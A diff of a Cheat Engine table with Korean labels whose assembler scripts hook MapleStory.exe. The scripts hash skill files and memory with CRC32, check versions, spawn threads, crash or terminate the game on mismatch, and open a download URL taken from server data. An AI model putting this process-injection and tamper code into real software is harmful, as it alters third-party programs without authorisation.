+cmp [edx],'Data'
+jne exit
+cmp [edx+4],'/Ski'
+jne exit
+cmp [edx+8],'ll/1'
+jne exit
+cmp [edx+C],'00.i'
+jne exit
+mov edx,[ebx-1c]
+mov [crcbase],edx
+or dword ptr [esi+34],01
+xor eax,eax
+mov edx,[allocd+680]
+jmp [018D123D]
+exit:
+mov edx,[allocd+680]
+or dword ptr [esi+34],01
+xor eax,eax
+jmp [018D123D]
+
+exit2:
+push #2000000
+call [sleepde2]
+jmp [018D123D]
+//508119E0:
+//jmp crccontrol
+//nop
+//returnhere:
+
+[DISABLE]
+</AssemblerScript>
+        </CheatEntry>
+      </CheatEntries>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>90</ID>
+      <Description>"skill img 체크 Error 의심"</Description>
+      <LastState/>
+      <Color>0000FF</Color>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+label(returnhere2)
+label(exit2)
+01400200:
+db '.\Data\Skill\*.img' 00
+01412100:
+db 00 00 00 00 96 30 07 77 2C 61 0E EE BA 51 09 99 19 C4 6D 07 8F F4 6A 70 35 A5 63 E9 A3 95 64 9E 32 88 DB 0E A4 B8 DC 79 1E E9 D5 E0 88 D9 D2 97 2B 4C B6 09 BD 7C B1 7E 07 2D B8 E7 91 1D BF 90 64 10 B7 1D F2 20 B0 6A 48 71 B9 F3 DE 41 BE 84 7D D4 DA 1A EB E4 DD 6D 51 B5 D4 F4 C7 85 D3 83 56 98 6C 13 C0 A8 6B 64 7A F9 62 FD EC C9 65 8A 4F 5C 01 14 D9 6C 06 63 63 3D 0F FA F5 0D 08 8D C8 20 6E 3B 5E 10 69 4C E4 41 60 D5 72 71 67 A2 D1 E4 03 3C 47 D4 04 4B FD 85 0D D2 6B B5 0A A5 FA A8 B5 35 6C 98 B2 42 D6 C9 BB DB 40 F9 BC AC E3 6C D8 32 75 5C DF 45 CF 0D D6 DC 59 3D D1 AB AC 30 D9 26 3A 00 DE 51 80 51 D7 C8 16 61 D0 BF B5 F4 B4 21 23 C4 B3 56 99 95 BA CF 0F A5 BD B8 9E B8 02 28 08 88 05 5F B2 D9 0C C6 24 E9 0B B1 87 7C 6F 2F 11 4C 68 58 AB 1D 61 C1 3D 2D 66 B6 90 41 DC 76 06 71 DB 01 BC 20 D2 98 2A 10 D5 EF 89 85 B1 71 1F B5 B6 06 A5 E4 BF 9F 33 D4 B8 E8 A2 C9 07 78 34 F9 00 0F 8E A8 09 96 18 98 0E E1 BB 0D 6A 7F 2D 3D 6D 08 97 6C 64 91 01 5C 63 E6 F4 51 6B 6B 62 61 6C 1C D8 30 65 85 4E 00 62 F2 ED 95 06 6C 7B A5 01 1B C1 F4 08 82 57 C4 0F F5 C6 D9 B0 65 50 E9 B7 12 EA B8 BE 8B 7C 88 B9 FC DF 1D DD 62 49 2D DA 15 F3 7C D3 8C 65 4C D4 FB 58 61 B2 4D CE 51 B5 3A 74 00 BC A3 E2 30 BB D4 41 A5 DF 4A D7 95 D8 3D 6D C4 D1 A4 FB F4 D6 D3 6A E9 69 43 FC D9 6E 34 46 88 67 AD D0 B8 60 DA 73 2D 04 44 E5 1D 03 33 5F 4C 0A AA C9 7C 0D DD 3C 71 05 50 AA 41 02 27 10 10 0B BE 86 20 0C C9 25 B5 68 57 B3 85 6F 20 09 D4 66 B9 9F E4 61 CE 0E F9 DE 5E 98 C9 D9 29 22 98 D0 B0 B4 A8 D7 C7 17 3D B3 59 81 0D B4 2E 3B 5C BD B7 AD 6C BA C0 20 83 B8 ED B6 B3 BF 9A 0C E2 B6 03 9A D2 B1 74 39 47 D5 EA AF 77 D2 9D 15 26 DB 04 83 16 DC 73 12 0B 63 E3 84 3B 64 94 3E 6A 6D 0D A8 5A 6A 7A 0B CF 0E E4 9D FF 09 93 27 AE 00 0A B1 9E 07 7D 44 93 0F F0 D2 A3 08 87 68 F2 01 1E FE C2 06 69 5D 57 62 F7 CB 67 65 80 71 36 6C 19 E7 06 6B 6E 76 1B D4 FE E0 2B D3 89 5A 7A DA 10 CC 4A DD 67 6F DF B9 F9 F9 EF BE 8E 43 BE B7 17 D5 8E B0 60 E8 A3 D6 D6 7E 93 D1 A1 C4 C2 D8 38 52 F2 DF 4F F1 67 BB D1 67 57 BC A6 DD 06 B5 3F 4B 36 B2 48 DA 2B 0D D8 4C 1B 0A AF F6 4A 03 36 60 7A 04 41 C3 EF 60 DF 55 DF 67 A8 EF 8E 6E 31 79 BE 69 46 8C B3 61 CB 1A 83 66 BC A0 D2 6F 25 36 E2 68 52 95 77 0C CC 03 47 0B BB B9 16 02 22 2F 26 05 55 BE 3B BA C5 28 0B BD B2 92 5A B4 2B 04 6A B3 5C A7 FF D7 C2 31 CF D0 B5 8B 9E D9 2C 1D AE DE 5B B0 C2 64 9B 26 F2 63 EC 9C A3 6A 75 0A 93 6D 02 A9 06 09 9C 3F 36 0E EB 85 67 07 72 13 57 00 05 82 4A BF 95 14 7A B8 E2 AE 2B B1 7B 38 1B B6 0C 9B 8E D2 92 0D BE D5 E5 B7 EF DC 7C 21 DF DB 0B D4 D2 D3 86 42 E2 D4 F1 F8 B3 DD 68 6E 83 DA 1F CD 16 BE 81 5B 26 B9 F6 E1 77 B0 6F 77 47 B7 18 E6 5A 08 88 70 6A 0F FF CA 3B 06 66 5C 0B 01 11 FF 9E 65 8F 69 AE 62 F8 D3 FF 6B 61 45 CF 6C 16 78 E2 0A A0 EE D2 0D D7 54 83 04 4E C2 B3 03 39 61 26 67 A7 F7 16 60 D0 4D 47 69 49 DB 77 6E 3E 4A 6A D1 AE DC 5A D6 D9 66 0B DF 40 F0 3B D8 37 53 AE BC A9 C5 9E BB DE 7F CF B2 47 E9 FF B5 30 1C F2 BD BD 8A C2 BA CA 30 93 B3 53 A6 A3 B4 24 05 36 D0 BA 93 06 D7 CD 29 57 DE 54 BF 67 D9 23 2E 7A 66 B3 B8 4A 61 C4 02 1B 68 5D 94 2B 6F 2A 37 BE 0B B4 A1 8E 0C C3 1B DF 05 5A 8D EF 02 2D 55 ED 78 D4 40 90 02 00 C4 00 5E 00 78 81 5E 00 00 00 00 00 00 00
+label(gotoread)
+label(zero)
+label(cmpaded)
+label(gotohand)
+define(alllocc,01410000)
+Registersymbol(alllocc) //inzer
+define(alllocc2,01414000)
+Registersymbol(alllocc2) //inzer
+define(alllocc3,01416000)
+Registersymbol(alllocc3) //inzer
+016D04FE:
+cmp [016CC0FE],1
+je exit2
+push skilldataGet
+jmp returnhere2
+exit2:
+push 00BB6820
+jmp returnhere2
+
+"MapleStory.exe"+2C6129:
+jmp 016D04FE
+returnhere2: //예외처리
+
+
+skilldataGet:
+db '.\Data\Skill\*.img' 00
+label(returnhere)
+label(exit)
+16CCDFE+700:
+cmp [016CC0FE],1 //cmpcount
+je exit
+mov [Tir+50],eax
+mov [Tir+54],ebx
+mov [Tir+58],ecx
+mov [Tir+5c],edx
+mov [Tir+60],edi
+mov [Tir+64],esi
+mov [Tir+68],esp
+mov [Tir+6C],ebp
+push 0
+push 08000027
+push 03
+push 0
+push 01
+push 80000000
+mov ebx,[eax]
+mov [0140020D],ebx
+mov ebx,[eax+4]
+mov [0140020D+4],ebx
+mov ebx,[eax+8]
+mov [0140020D+8],ebx
+push 01400200
+xor eax,eax
+xor ebx,ebx
+call dword ptr [creafd] //kernel32.CreateFileA
+mov [alllocc],eax
+mov eax,[alllocc]
+push 00
+lea edx,[ebp+0C]
+push edx
+push 00001000
+lea eax,[alllocc2]
+push eax
+gotoread:
+mov ebx,[alllocc]
+push ebx
+call dword ptr [MapleStory.exe+7100A0] //kernel32.ReadFile
+test eax,eax
+je gotohand
+mov eax,[ebp+0C]
+test eax,eax
+je gotohand
+xor ecx,ecx
+cmpaded:
+cmp ecx,[ebp+0C]
+jae zero
+movzx edx,byte ptr [alllocc2+ecx]
+mov ebx,eax
+and ebx,000000FF
+xor edx,ebx
+lea ebx,[01412100]
+shr eax,08
+xor eax,[ebx+edx*4]
+mov ebx,[alllocc3]
+mov [01421300],eax
+inc ecx
+jmp cmpaded
+zero:
+push 00
+lea eax,[ebp+0C]
+push eax
+push 00001000
+lea ecx,[alllocc3]
+push ecx
+jmp gotoread
+test ebx,ebx
+je gotoexit
+push ebx
+gotohand:
+call dword ptr [closeh] //close kernel32.CloseHandle
+jmp gotoexit
+gotoexit:
+mov edx,[01421300]
+not edx
+mov [Tir-40],edx
+mov eax,[Tir+50]
+mov ebx,[Tir+54]
+mov ecx,[Tir+58]
+mov edx,[Tir+5c]
+mov edi,[Tir+60]
+mov esi,[Tir+64]
+mov esp,[Tir+68]
+mov ebp,[Tir+6C]
+
+push [Tir-40]
+push xd //%x
+push 00000009
+mov edi,[dataaad]
+lea eax,[savaskill+edi]
+push eax
+call apiX7F
+add [dataaad],7
+mov eax,[Tir+50]
+mov ebx,[Tir+54]
+mov ecx,[Tir+58]
+mov edx,[Tir+5c]
+mov edi,[Tir+60]
+mov esi,[Tir+64]
+mov esp,[Tir+68]
+mov ebp,[Tir+6C]
+push eax
+lea eax,[ebp-00000244]
+jmp returnhere//jmp returnhere
+exit:
+push eax
+lea eax,[ebp-00000244]
+jmp returnhere//jmp returnhere
+"MapleStory.exe"+2C6158:
+jmp 16CCDFE+700
+nop 2
+returnhere:
+
+
+16CCDFE:
+push ebp
+mov ebp,esp
+sub esp,0000044C
+lea eax,[ebp-00000244]
+push eax
+call MapleStory.exe+2C5EAE
+test eax,eax
+pop ecx
+je MapleStory.exe+2C61B6
+push esi
+lea eax,[ebp-00000244]
+push eax
+lea eax,[ebp-0000044C]
+push skilldataGet
+push eax
+call MapleStory.exe+685645
+add esp,0C
+lea eax,[ebp-00000140]
+push eax
+lea eax,[ebp-0000044C]
+push eax
+call dword ptr [MapleStory.exe+71005C]
+mov esi,eax
+mov [dumpin-700],eax
+mov [dumpin-704],ebx
+mov [dumpin-708],ecx
+mov [dumpin-70C],edx
+mov [dumpin-710],edi
+mov [dumpin-714],esi
+mov [dumpin-718],esp
+mov [dumpin-71C],ebp
+push 0
+push 0
+push 018A1C00
+push 018A1C00
+push 0
+push 0
+call [crea]
+mov eax,[dumpin-700]
+mov ebx,[dumpin-704]
+mov ecx,[dumpin-708]
+mov edx,[dumpin-70C]
+mov edi,[dumpin-710]
+mov esi,[dumpin-714]
+mov esp,[dumpin-718]
+mov ebp,[dumpin-71C]
+cmp esi,-01
+je MapleStory.exe+2C61AE
+lea eax,[ebp-00000114]
+jmp 16CCDFE+700
+nop 2
+push eax
+lea eax,[ebp-0000044C]
+push MapleStory.exe+7B6814
+push eax
+call MapleStory.exe+685645
+add esp,10
+test byte ptr [ebp-00000140],05
+je MapleStory.exe+2C618F
+push 00000080
+lea eax,[ebp-0000044C]
+push eax
+call dword ptr [MapleStory.exe+710058]
+lea eax,[ebp-0000044C]
+push eax
+call dword ptr [MapleStory.exe+710100]
+lea eax,[ebp-00000140]
+push eax
+push esi
+call dword ptr [MapleStory.exe+710054]
+test eax,eax
+jne MapleStory.exe+2C6152
+push esi
+call dword ptr [MapleStory.exe+710050]
+pop esi
+leave
+
+//createThread(16CCDFE)
+018A1C00-200:
+db 'hash.txt' 00
+label(rola)
+label(rolaf)
+label(rolcc2)
+label(rolcc3)
+018A1C00:
+cmp [016CC0FE-4],1
+je rolaf
+mov [016CC0FE-4],1
+push #6500
+call [sleepde2]
+mov [00C83B83],61445C2E
+mov [00C83B83+4],495C6174
+mov [00C83B83+8],5C6D6574
+mov [00C83B83+C],736E6F43
+mov [00C83B83+10],5C656D75
+mov [00C83B83+14],6D692E2A
+mov [00C83B83+18],00000067
+
+mov [01400200],61445C2E
+mov [01400200+4],495C6174
+mov [01400200+8],5C6D6574
+mov [01400200+C],736E6F43
+mov [01400200+10],5C656D75
+mov [01400200+14],0000002A
+
+mov [016CD54E+2],01400214
+mov [016CD557+2],01400214+4
+mov [016CD560+2],01400214+8
+
+push 0
+push 0
+push 16CCDFE
+push 16CCDFE
+push 0
+push 0
+call [crea]
+push #3500
+call [sleepde2]
+xor esi,esi
+xor eax,eax
+rola:
+mov eax,savaskill-1
+inc esi
+cmp [eax+esi],0
+jne rola
+mov [018A1C00-300],esi
+xor esi,esi
+mov eax,savaskill
+rolcc:
+mov ebx,[eax+esi] //V
+rol ebx,5
+mov [eax+esi],ebx
+add esi,4
+cmp [eax+esi],0
+jne rolcc
+mov [016CC0FE],1
+xor ecx,ecx
+xor esi,esi
+xor eax,eax
+xor ebx,ebx
+
+rolcc2:
+mov eax,[019E0FEE]
+mov eax,[eax+c]
+mov ebx,[eax+esi]
+mov edi,[savaskill+esi]
+mov edx,[savaskill+esi+4]
+cmp edx,0
+je rolaf
+rol ebx,5
+add esi,4
+cmp edi,ebx
+je rolcc2
+db 'dcc'
+
+rolaf:
+mov eax,[highter]
+mov [esp],eax
+ret
+
+rolcc3:
+mov eax,[highter]
+mov [esp],eax
+ret
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+      <CheatEntries>
+        <CheatEntry>
+          <ID>328</ID>
+          <Description>"skill basd"</Description>
+          <ShowAsSigned>0</ShowAsSigned>
+          <VariableType>String</VariableType>
+          <Length>10</Length>
+          <Unicode>0</Unicode>
+          <CodePage>0</CodePage>
+          <ZeroTerminate>1</ZeroTerminate>
+          <Address>savaskill</Address>
+        </CheatEntry>
+      </CheatEntries>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>495</ID>
+      <Description>"버전체크 노포인터"</Description>
+      <VariableType>String</VariableType>
+      <Length>10</Length>
+      <Unicode>0</Unicode>
+      <CodePage>0</CodePage>
+      <ZeroTerminate>1</ZeroTerminate>
+      <Address>018D1245</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>497</ID>
+      <Description>"버전체크 후포인터"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>String</VariableType>
+      <Length>10</Length>
+      <Unicode>0</Unicode>
+      <CodePage>0</CodePage>
+      <ZeroTerminate>1</ZeroTerminate>
+      <Address>00B18DCC</Address>
+      <Offsets>
+        <Offset>-6</Offset>
+        <Offset>102F70C</Offset>
+      </Offsets>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>502</ID>
+      <Description>"crcbase"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>4 Bytes</VariableType>
+      <Address>crcbase</Address>
+      <Offsets>
+        <Offset>0</Offset>
+      </Offsets>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>508</ID>
+      <Description>"crc 생성 dump"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+label(exit)
+//createThread(00C84000)
+00C84000:
+mov eax,00401000 //00A24F0C
+xor esi,esi
+xx:
+cmp esi,620000
+jae exit
+mov ebx,[eax]
+rol ebx,06
+add ebx,20000
+xx2:
+mov [00C85000+esi],ebx
+add esi,04
+add eax,04
+jmp xx
+exit:
+ret
+
+[DISABLE]
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>518</ID>
+      <Description>"사용안하는 비활성화crc"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+01C83FFA:
+ret
+mov [dumpin-50],eax
+mov [dumpin-54],ebx
+mov [dumpin-58],ecx
+mov [dumpin-5C],edx
+mov [dumpin-60],edi
+mov [dumpin-64],esi
+mov [dumpin-68],esp
+mov [dumpin-6C],ebp
+push #30000
+call [sleepde2]
+mov eax,[dumpin-50]
+mov ebx,[dumpin-54]
+mov ecx,[dumpin-58]
+mov edx,[dumpin-5C]
+mov edi,[dumpin-60]
+mov esi,[dumpin-64]
+mov esp,[dumpin-68]
+mov ebp,[dumpin-6C]
+push 0
+push 0
+mov eax,[crcbase]
+lea eax,[eax+E483F0] //crcstasrt
+push eax
+push eax
+push 0
+push 0
+mov eax,[dumpin-50]
+call [crea]
+mov eax,[dumpin-50]
+mov ebx,[dumpin-54]
+mov ecx,[dumpin-58]
+mov edx,[dumpin-5C]
+mov edi,[dumpin-60]
+mov esi,[dumpin-64]
+mov esp,[dumpin-68]
+mov ebp,[dumpin-6C]
+push 0
+push 0
+mov eax,01C83FFA-610004
+add eax,610004
+push eax
+push eax
+push 0
+push 0
+mov eax,[dumpin-50]
+call [crea]
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+
+ 
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>584</ID>
+      <Description>"ThreadGet NameSpace.dll,mss32.dll"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+ThreadGet:
+push allocd-80
+call [loadL]
+add eax,119E6
+mov [018D123D],eax
+xor eax,eax
+push allocd-C0
+call [loadL]
+add eax,3b0
+mov eax,[eax]
+mov [018D123D+8],eax
+ret
+createThread(ThreadGet)
+[DISABLE]
+
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>585</ID>
+      <Description>"다운서스펜드기"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+label(returnhere)
+label(exit)
+label(exit2)
+01B10000:
+cmp [0178F310],1
+je exit
+call 007608C2
+jmp returnhere
+exit:
+push #2000000
+call [sleepde2]
+call 007608C2
+jmp returnhere
+
+exit2:
+mov [dumpin+700],eax
+mov [dumpin+704],ebx
+mov [dumpin+708],ecx
+mov [dumpin+70C],edx
+mov [dumpin+714],edi
+mov [dumpin+718],esi
+mov [dumpin+71C],esp
+mov [dumpin+720],ebp
+push 0
+push 0
+mov eax,[crcbase]
+lea eax,[eax+E483F0] //crcstasrt
+push eax
+push eax
+push 0
+push 0
+mov eax,[dumpin-500]
+call [crea]
+mov eax,[dumpin+700]
+mov ebx,[dumpin+704]
+mov ecx,[dumpin+708]
+mov edx,[dumpin+70C]
+mov edi,[dumpin+714]
+mov esi,[dumpin+718]
+mov esp,[dumpin+71C]
+mov ebp,[dumpin+720]
+push 0
+push 0
+mov eax,[01A00C40-30]
+lea eax,[eax+450] //crcstasrt
+push eax
+push eax
+push 0
+push 0
+mov eax,[dumpin-500]
+call [crea]
+mov eax,[dumpin+700]
+mov ebx,[dumpin+704]
+mov ecx,[dumpin+708]
+mov edx,[dumpin+70C]
+mov edi,[dumpin+714]
+mov esi,[dumpin+718]
+mov esp,[dumpin+71C]
+mov ebp,[dumpin+720]
+mov [dumpin+490],#0
+call MapleStory.exe+3608C2
+jmp returnhere
+
+"MapleStory.exe"+61714A:
+jmp 01B10000
+returnhere:
+
+[DISABLE]
+
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>593</ID>
+      <Description>"ijl15.dll base 얻기"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+01A00C40:
+db 'ijl15.dll' 00
+
+01C84300: //ijl15.dll get
+push #9000
+call [sleepde2]
+push 01A00C40
+call [LoadL]
+mov [01A00C40-30],eax
+ret
+ 
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>594</ID>
+      <Description>"ijl15.dll crc"</Description>
+      <VariableType>4 Bytes</VariableType>
+      <Address>01A00C40-30</Address>
+      <Offsets>
+        <Offset>450</Offset>
+      </Offsets>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>622</ID>
+      <Description>"다운로드 완료"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+015061C0:
+db B4 D9 BF EE B7 CE B5 E5 B0 A1 20 BF CF B7 E1 20 B5 C7 BE FA BD C0 B4 CF B4 D9 2E 00 00 00
+
+01506220:
+db C8 AE C0 CE C0 BB 20 B4 A9 B8 A3 B8 E9 20 C1 BE B7 E1 20 B5 CB B4 CF B4 D9 2E 0D 0A B0 D4 C0 D3 C0 BB 20 C0 E7 C1 A2 BC D3 20 C7 D8 C1 D6 BC BC BF E4 2E 00 00
+0190105E:
+push 0
+push 01506220 //제목
+push 01506220
+push 0
+call [boxa]
+push 0
+push fffffffe
+call [MapleStory.exe+71012C] //kernel32.TerminateProcess
+ret
+ 
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>650</ID>
+      <Description>"Auto Assemble script"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+
+01400200:
+db '110.img' 00
+01412100:
+db 00 00 00 00 96 30 07 77 2C 61 0E EE BA 51 09 99 19 C4 6D 07 8F F4 6A 70 35 A5 63 E9 A3 95 64 9E 32 88 DB 0E A4 B8 DC 79 1E E9 D5 E0 88 D9 D2 97 2B 4C B6 09 BD 7C B1 7E 07 2D B8 E7 91 1D BF 90 64 10 B7 1D F2 20 B0 6A 48 71 B9 F3 DE 41 BE 84 7D D4 DA 1A EB E4 DD 6D 51 B5 D4 F4 C7 85 D3 83 56 98 6C 13 C0 A8 6B 64 7A F9 62 FD EC C9 65 8A 4F 5C 01 14 D9 6C 06 63 63 3D 0F FA F5 0D 08 8D C8 20 6E 3B 5E 10 69 4C E4 41 60 D5 72 71 67 A2 D1 E4 03 3C 47 D4 04 4B FD 85 0D D2 6B B5 0A A5 FA A8 B5 35 6C 98 B2 42 D6 C9 BB DB 40 F9 BC AC E3 6C D8 32 75 5C DF 45 CF 0D D6 DC 59 3D D1 AB AC 30 D9 26 3A 00 DE 51 80 51 D7 C8 16 61 D0 BF B5 F4 B4 21 23 C4 B3 56 99 95 BA CF 0F A5 BD B8 9E B8 02 28 08 88 05 5F B2 D9 0C C6 24 E9 0B B1 87 7C 6F 2F 11 4C 68 58 AB 1D 61 C1 3D 2D 66 B6 90 41 DC 76 06 71 DB 01 BC 20 D2 98 2A 10 D5 EF 89 85 B1 71 1F B5 B6 06 A5 E4 BF 9F 33 D4 B8 E8 A2 C9 07 78 34 F9 00 0F 8E A8 09 96 18 98 0E E1 BB 0D 6A 7F 2D 3D 6D 08 97 6C 64 91 01 5C 63 E6 F4 51 6B 6B 62 61 6C 1C D8 30 65 85 4E 00 62 F2 ED 95 06 6C 7B A5 01 1B C1 F4 08 82 57 C4 0F F5 C6 D9 B0 65 50 E9 B7 12 EA B8 BE 8B 7C 88 B9 FC DF 1D DD 62 49 2D DA 15 F3 7C D3 8C 65 4C D4 FB 58 61 B2 4D CE 51 B5 3A 74 00 BC A3 E2 30 BB D4 41 A5 DF 4A D7 95 D8 3D 6D C4 D1 A4 FB F4 D6 D3 6A E9 69 43 FC D9 6E 34 46 88 67 AD D0 B8 60 DA 73 2D 04 44 E5 1D 03 33 5F 4C 0A AA C9 7C 0D DD 3C 71 05 50 AA 41 02 27 10 10 0B BE 86 20 0C C9 25 B5 68 57 B3 85 6F 20 09 D4 66 B9 9F E4 61 CE 0E F9 DE 5E 98 C9 D9 29 22 98 D0 B0 B4 A8 D7 C7 17 3D B3 59 81 0D B4 2E 3B 5C BD B7 AD 6C BA C0 20 83 B8 ED B6 B3 BF 9A 0C E2 B6 03 9A D2 B1 74 39 47 D5 EA AF 77 D2 9D 15 26 DB 04 83 16 DC 73 12 0B 63 E3 84 3B 64 94 3E 6A 6D 0D A8 5A 6A 7A 0B CF 0E E4 9D FF 09 93 27 AE 00 0A B1 9E 07 7D 44 93 0F F0 D2 A3 08 87 68 F2 01 1E FE C2 06 69 5D 57 62 F7 CB 67 65 80 71 36 6C 19 E7 06 6B 6E 76 1B D4 FE E0 2B D3 89 5A 7A DA 10 CC 4A DD 67 6F DF B9 F9 F9 EF BE 8E 43 BE B7 17 D5 8E B0 60 E8 A3 D6 D6 7E 93 D1 A1 C4 C2 D8 38 52 F2 DF 4F F1 67 BB D1 67 57 BC A6 DD 06 B5 3F 4B 36 B2 48 DA 2B 0D D8 4C 1B 0A AF F6 4A 03 36 60 7A 04 41 C3 EF 60 DF 55 DF 67 A8 EF 8E 6E 31 79 BE 69 46 8C B3 61 CB 1A 83 66 BC A0 D2 6F 25 36 E2 68 52 95 77 0C CC 03 47 0B BB B9 16 02 22 2F 26 05 55 BE 3B BA C5 28 0B BD B2 92 5A B4 2B 04 6A B3 5C A7 FF D7 C2 31 CF D0 B5 8B 9E D9 2C 1D AE DE 5B B0 C2 64 9B 26 F2 63 EC 9C A3 6A 75 0A 93 6D 02 A9 06 09 9C 3F 36 0E EB 85 67 07 72 13 57 00 05 82 4A BF 95 14 7A B8 E2 AE 2B B1 7B 38 1B B6 0C 9B 8E D2 92 0D BE D5 E5 B7 EF DC 7C 21 DF DB 0B D4 D2 D3 86 42 E2 D4 F1 F8 B3 DD 68 6E 83 DA 1F CD 16 BE 81 5B 26 B9 F6 E1 77 B0 6F 77 47 B7 18 E6 5A 08 88 70 6A 0F FF CA 3B 06 66 5C 0B 01 11 FF 9E 65 8F 69 AE 62 F8 D3 FF 6B 61 45 CF 6C 16 78 E2 0A A0 EE D2 0D D7 54 83 04 4E C2 B3 03 39 61 26 67 A7 F7 16 60 D0 4D 47 69 49 DB 77 6E 3E 4A 6A D1 AE DC 5A D6 D9 66 0B DF 40 F0 3B D8 37 53 AE BC A9 C5 9E BB DE 7F CF B2 47 E9 FF B5 30 1C F2 BD BD 8A C2 BA CA 30 93 B3 53 A6 A3 B4 24 05 36 D0 BA 93 06 D7 CD 29 57 DE 54 BF 67 D9 23 2E 7A 66 B3 B8 4A 61 C4 02 1B 68 5D 94 2B 6F 2A 37 BE 0B B4 A1 8E 0C C3 1B DF 05 5A 8D EF 02 2D 55 ED 78 D4 40 90 02 00 C4 00 5E 00 78 81 5E 00 00 00 00 00 00 00
+label(gotoread)
+label(zero)
+label(cmpaded)
+label(gotohand)
+define(alllocc,01410000)
+Registersymbol(alllocc) //inzer
+define(alllocc2,01414000)
+Registersymbol(alllocc2) //inzer
+define(alllocc3,01416000)
+Registersymbol(alllocc3) //inzer
+
+01400300:
+push 0
+push 08000027
+push 03
+push 0
+push 01
+push 80000000
+push 01400200
+call dword ptr [creafd] //kernel32.CreateFileA
+mov [alllocc],eax
+mov eax,[alllocc]
+push 00
+lea edx,[ebp+0C]
+push edx
+push 00001000
+lea eax,[alllocc2]
+push eax
+gotoread:
+mov ebx,[alllocc]
+push ebx
+call dword ptr [MapleStory.exe+7100A0] //kernel32.ReadFile
+
+test eax,eax
+je gotohand
+mov eax,[ebp+0C]
+test eax,eax
+je gotohand
+xor ecx,ecx
+cmpaded:
+cmp ecx,[ebp+0C]
+jae zero
+movzx edx,byte ptr [alllocc2+ecx]
+mov ebx,eax
+and ebx,000000FF
+xor edx,ebx
+lea ebx,[01412100]
+shr eax,08
+xor eax,[ebx+edx*4]
+mov ebx,[alllocc3]
+mov [01421300],eax
+inc ecx
+jmp cmpaded
+zero:
+push 00
+lea eax,[ebp+0C]
+push eax
+push 00001000
+lea ecx,[alllocc3]
+push ecx
+jmp gotoread
+test ebx,ebx
+je gotoexit
+push ebx
+gotohand:
+call dword ptr [closeh] //close kernel32.CloseHandle
+jmp gotoexit
+gotoexit:
+mov edx,[01421300]
+not edx
+mov eax,[esp-4]
+mov [esp],eax
+ret
+
+
+[DISABLE]
+
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>671</ID>
+      <Description>"Auto Assemble script"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+label(download)
+label(goto1)
+label(goto2)
+
+01522D00:
+db B3 CA B9 AB 20 BF C0 B7 A1 20 B5 C8 20 B9 F6 C0 FC C0 D4 B4 CF B4 D9 2E 00 9E 85 EB 8B 88 EB 8B A4 2E
+01522D00+70:
+db C8 AE C0 CE C0 BB 20 B4 A9 B8 A3 B8 E9 20 BB F5 B9 F6 C0 FC 20 B4 D9 BF EE B7 CE B5 E5 20 B8 B5 C5 A9 B7 CE 20 B5 E9 BE EE B0 A1 20 C1 FD B4 CF B4 D9 2E 00 20 EB 93 A4 EC 96 B4 EA B0 80 20 EC A7 91 EB 8B 88 EB 8B A4 2E
+
+01961000:
+mov eax,[019E0FEE]
+mov eax,[eax+8]
+add eax,1
+push eax
+push MapleStory.exe+7B0F4F //%d
+push 00000003
+push 01521000
+call apiX7F
+push 018D1245+1
+push MapleStory.exe+7B0F4F //%d
+push 00000003
+push 01521008
+call apiX7F
+mov eax,[019E0FEE]
+mov eax,[eax+8]
+goto1:
+inc eax
+cmp [eax],'URL='
+jne goto1
+add eax,4
+mov [01520D00],eax
+goto2:
+inc eax
+cmp [eax],'&lt;&lt;&lt;&lt;'
+jne goto2
+mov [eax],0 //exit
+mov eax,[01521000]
+cmp [01521008],eax
+jae download
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+
+download:
+push 0
+push 01522D00
+push 01522D00+70
+push 0
+call [boxa]
+
+PUSH 5
+PUSH 0
+PUSH 0
+PUSH [01520D00]
+PUSH 0
+PUSH 0
+call [0150501C]
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+createThread(01961000)
+ 
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>672</ID>
+      <Description>"오래된 버전 URL링크 필터기,얻어오기"</Description>
